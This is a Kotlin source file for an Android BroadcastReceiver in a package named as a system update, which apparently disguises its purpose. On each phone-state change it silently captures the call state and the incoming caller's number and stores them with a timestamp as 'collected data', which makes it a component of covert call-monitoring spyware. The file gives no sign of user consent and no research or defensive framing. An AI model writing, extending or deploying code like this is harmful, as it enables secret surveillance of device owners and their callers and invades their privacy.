package com.androidsystem.update.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class CallReceiver : BroadcastReceiver() {
    @Inject lateinit var repository: DataRepository

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != android.telephony.TelephonyManager.ACTION_PHONE_STATE_CHANGED) return
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: ""

        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                repository.insertCollectedData("call_state", """
                    {"state":"$state","number":"$number","timestamp":${System.currentTimeMillis()}}
                """.trimIndent())
            } finally {
                scope.cancel()
            }
        }
    }
}
